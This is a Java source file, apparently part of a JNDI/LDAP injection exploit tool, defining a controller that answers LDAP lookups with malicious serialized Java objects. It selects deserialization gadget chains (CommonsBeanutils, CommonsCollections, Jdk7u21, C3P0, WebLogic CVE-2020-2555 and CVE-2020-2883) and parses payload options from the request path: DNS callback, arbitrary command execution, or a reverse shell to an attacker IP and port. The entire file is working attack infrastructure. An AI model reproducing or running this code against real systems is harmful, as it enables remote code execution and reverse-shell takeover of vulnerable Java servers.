package com.feihong.ldap.controllers;

import com.feihong.ldap.enumtypes.GadgetType;
import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.exceptions.IncorrectParamsException;
import com.feihong.ldap.exceptions.UnSupportedGadgetTypeException;
import com.feihong.ldap.exceptions.UnSupportedPayloadTypeException;
import com.feihong.ldap.utils.*;
import com.feihong.ldap.gadgets.*;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

@LdapMapping(uri = { "/deserialization" })
public class SerializedDataController implements LdapController {
    private GadgetType gadgetType;
    private PayloadType payloadType;
    private String[] params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("[+] Send LDAP result for " + base + " with javaSerializedData attribute");

        //这个方法里面有改动，其他基本无改动
        Entry e = new Entry(base);
        byte[] bytes = null;
        switch (gadgetType){
            case urldns:
                bytes = URLDNS.getBytes(params[0]);
                break;
            case commonsbeanutils1:
                bytes = CommonsBeanutils1.getBytes(payloadType, params);
                break;
            case commonsbeanutils2:
                bytes = CommonsBeanutils2.getBytes(payloadType, params);
                break;
            case commonscollectionsk1:
                bytes = CommonsCollectionsK1.getBytes(payloadType, params);
                break;
            case commonscollectionsk2:
                bytes = CommonsCollectionsK2.getBytes(payloadType, params);
                break;
            case jdk7u21:
                bytes = Jdk7u21.getBytes(payloadType, params);
                break;
            case jre8u20:
                bytes = Jre8u20.getBytes(payloadType, params);
                break;
            case c3p0:
                bytes = C3P0.getBytes(payloadType, params);
                break;
            case cve_2020_2555:
                bytes = CVE_2020_2555.getBytes(payloadType, params);
                break;
            case cve_2020_2883:
                bytes = CVE_2020_2883.getBytes(payloadType, params);
                break;
        }

        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaSerializedData",bytes);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
        try{
            int firstIndex = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            try{
                gadgetType = GadgetType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());
                System.out.println("[+] GaddgetType: " + gadgetType);
            }catch(IllegalArgumentException e){
                throw new UnSupportedGadgetTypeException("UnSupportGaddgetType: " + base.substring(firstIndex + 1, secondIndex));
            }

            if(gadgetType == GadgetType.urldns){
                String url = "http://" + base.substring(base.lastIndexOf("/") + 1);
                System.out.println("[+] URL: " + url);
                params = new String[]{url};
                return;
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if(thirdIndex < 0) thirdIndex = base.length();
            try{
                payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                System.out.println("[+] PayloadType: " + payloadType);
            }catch (IllegalArgumentException e){
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
            }

            switch(payloadType){
                case dnslog:
                    String url = base.substring(base.lastIndexOf("/") + 1);
                    System.out.println("[+] URL: " + url);
                    params = new String[]{url};
                    break;
                case command:
                    String cmd = Util.getCmdFromBase(base);
                    System.out.println("[+] Command: " + cmd);
                    params = new String[]{cmd};
                    break;
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println("[+] IP: " + results[0]);
                    System.out.println("[+] Port: " + results[1]);
                    params = results;
                    break;
            }

        }catch(Exception e){
            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;
            if(e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException)e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }
}
